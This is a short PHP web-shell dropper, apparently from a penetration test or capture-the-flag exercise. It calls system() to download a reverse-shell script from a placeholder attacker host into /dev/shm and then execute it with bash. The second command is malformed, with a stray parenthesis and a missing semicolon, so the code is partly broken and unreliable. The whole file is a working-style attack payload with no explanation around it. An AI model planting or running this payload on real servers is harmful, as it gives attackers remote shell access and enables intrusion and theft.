<?php
system('curl http://ATTACKER-IP:PORT/rev.sh -o /dev/shm/rev.sh');
system('bash (dev/shm/rev.sh')
?>
